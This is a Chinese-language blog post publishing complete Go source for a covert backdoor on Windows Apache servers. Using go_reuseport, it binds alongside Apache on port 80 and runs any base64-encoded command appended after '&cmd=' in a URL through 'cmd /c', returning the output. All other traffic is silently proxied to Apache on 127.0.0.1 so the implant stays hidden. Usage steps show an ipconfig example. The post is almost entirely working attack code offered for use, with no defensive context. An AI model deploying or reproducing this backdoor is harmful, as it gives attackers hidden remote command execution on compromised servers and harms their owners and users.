---
layout: post
title: "端口复用：使用go_reuseport实现Apache 服务器正向后门（Go实现）"
date: 2019-07-12 
description: "端口复用"
tag: 工具开发
---   

### 直接公布源代码吧


利用go_reuseport,实现对apache服务器80端口请求的接管，将特定的请求进行特定的回应，其他请求通过回环地址转发给apache

可自行设定过滤关键字，目前关键字为“&cmd=”，请求时后方加上要执行的命令（base64编码后的命令）

Usage：

1.管理员权限cmd

2.执行 go-reuseport.exe x.x.x.x:80

3.浏览器请求 http:x.x.x.x/&cmd=aXBjb25maWc=    浏览器将返回ipconfig命令的执行结果。


    package main

    import (
        "encoding/base64"
        "fmt"
        "github.com/kavu/go_reuseport"
        "html"
        "io"
        "net"
        "net/http"
        "os"
        "os/exec"
        "strings"
    )

    func main() {
        //get local ip
        //ipmap, err := getIP()
        fmt.Println("Welcome!")

        var input_ipaddr = os.Args[1]

        listener, err := reuseport.NewReusablePortListener("tcp", input_ipaddr)
        if err != nil {
            panic(err)
        }
        defer listener.Close()

        server := &http.Server{}
        http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
            //fmt.Println(os.Getgid())
            var fullpath string = html.UnescapeString(r.URL.RequestURI())
            var result bool = strings.Contains(fullpath, "&cmd=")
            if result{
                index_f := strings.Index(fullpath,"cmd=")
                cmd_str := fullpath[index_f+4:]
                decodeBytes, err := base64.StdEncoding.DecodeString(cmd_str	)
                cmd := exec.Command("cmd","/c", string(decodeBytes))
                out, err := cmd.Output()
                if err !=nil{
                    fmt.Println(err)
                }
                var re string =  string(out)
                fmt.Fprintf(w, " <html>")
                fmt.Fprintf(w, " %q\n", strings.Replace(re, "\r\n", "</br>", -1))
                //fmt.Fprintf(w, "Hello, %q\n", html.EscapeString(r.URL.Path))
                fmt.Fprintf(w, " </html>")
            }else {
                transport :=http.DefaultTransport
                outReq := new(http.Request)
                *outReq = *r
                if clientIP,_, err := net.SplitHostPort(r.RemoteAddr); err == nil {
                    if prior, ok := outReq.Header["X-Forwarded-For"]; ok {
                        clientIP = strings.Join(prior, ",") + "," + clientIP
                    }
                    outReq.Header.Set("X-Forwarded-For", clientIP)
                    outReq.Header.Set("Host", "127.0.0.1")
                    outReq.URL.Scheme = "http"
                    outReq.URL.Host = "127.0.0.1"
                }

                res, err := transport.RoundTrip(outReq)
                if err != nil {
                    w.WriteHeader(http.StatusBadGateway)
                    return
                }

                for key, value :=range res.Header{
                    for _, v := range value{
                        w.Header().Add(key, v)
                    }
                }
                w.WriteHeader(res.StatusCode)
                io.Copy(w, res.Body)
                res.Body.Close()
            }

        })

        panic(server.Serve(listener))
    }


    func getIP()(map[string]string, error){
        ips :=  make(map[string]string)

        interfaces, err := net.Interfaces()
        if err != nil {
            return nil,err
        }

        for _, i := range interfaces {
            byName, err := net.InterfaceByName(i.Name)
            if err != nil {
                return nil,err
            }
            addresses, err := byName.Addrs()
            for _, v := range addresses {
                ips[byName.Name] = v.String()
            }
        }
        return ips, err
    }